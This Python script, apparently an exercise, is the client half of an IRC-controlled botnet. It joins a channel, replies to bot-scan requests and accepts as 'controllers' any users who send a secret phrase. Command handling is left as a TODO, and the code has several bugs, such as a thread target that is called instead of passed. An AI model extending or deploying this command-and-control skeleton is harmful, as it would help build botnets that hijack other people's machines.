import sys, socket, time, threading, re
import logging as log

def scan_bots(channel):
    print("Scanning bots in #" + channel + "...")
    irc.sendall(bytearray('WHO #'+channel+'\n', 'utf-8'))
    # receive list of current users in channel
    data = irc.recv(2040)

    return

def establish_protocol(hostname, port, channel, secret):
    sys.stderr.write("Joining IRC channel...\n")
    # IRC server protocol
    irc.sendall(bytearray('NICK bot\n', 'utf-8'))
    irc.sendall(bytearray('USER bot_ * : bot\n', 'utf-8'))
    irc.sendall(bytearray('JOIN #' + channel + '\n', 'utf-8'))

    return

def receive_msg():
    sys.stderr.write("Receiving irc messages...\n")
    while True:
        message = irc.recv(2040)
        sys.stderr.write("Message received!\n")

        # message_split[1] = Nickname
        message_split = re.split('!|:', message.decode('utf-8'))
        print(message.decode('utf-8'))

        # check for ping-pong message 
        if message.find(bytearray('PING', 'utf-8')) != -1:
            sys.stderr.write("Sending PONG "  + message_split[1] + "\n")
            irc.sendall(bytearray('PONG ' + message_split[1], 'utf-8'))

        # if PRIVMSG from other channel
        elif len(message_split) == 4:
            # actual_message = Message received without escape characters
            actual_message = message_split[3].split()[0]

            if actual_message == 'BOTSCAN':
                print("Bot scan request received. Sending bot number...")
                irc.sendall(bytearray('PRIVMSG ' + message_split[1] + ' 0 * : ' + bot_num, 'utf-8'))
            # authenticate unknown controller
            elif (message_split[1] not in controllers) and (actual_message == secret_phrase):
                sys.stderr.write(message_split[1] + " is a Controller!\n")
                controllers.append(message_split[1])
                irc.sendall(bytearray('PRIVMSG '+ message_split[1] + ' :hi from bot \n', 'utf-8'))
            elif message_split[1] in controllers:
                sys.stderr.write("Message from controller "+ message_split[1] +"\n")
                # TODO handle controller message here
        
    return

if __name__ == '__main__':

    if len(sys.argv) == 5:
        hostname = sys.argv[1]
        port = sys.argv[2]
        channel = sys.argv[3]
        secret_phrase = sys.argv[4]

        # authenticated controllers
        controllers = []
        # assume first bot
        bot_num = 1

        # Connect to controller
        irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        while True:
            try:
                sys.stderr.write("Attempting to connect to server...\n")
                irc.connect((hostname, int(port)))
                # establish irc protocol
                sys.stderr.write("Connected to server!\n")
                establish_protocol(hostname, port, channel, secret_phrase)
               
                #start receiving thread
                sys.stderr.write("Starting recv thread...\n")
                receive_thread = threading.Thread(target=receive_msg(), args=())
                receive_thread.daemon = True
                receive_thread.start()

            except socket.error as e:
                sys.stderr.write("{0}\n".format(e))
                sys.stderr.write("Sleeping...\n")
                # If connection fails, sleep for 5s then connect again 
                time.sleep(5)
                continue
    else:
        sys.stderr.write("USAGE: python3 bot.py <hostname> <port> <channel> <secret-phrase>\n")
        sys.exit(1)
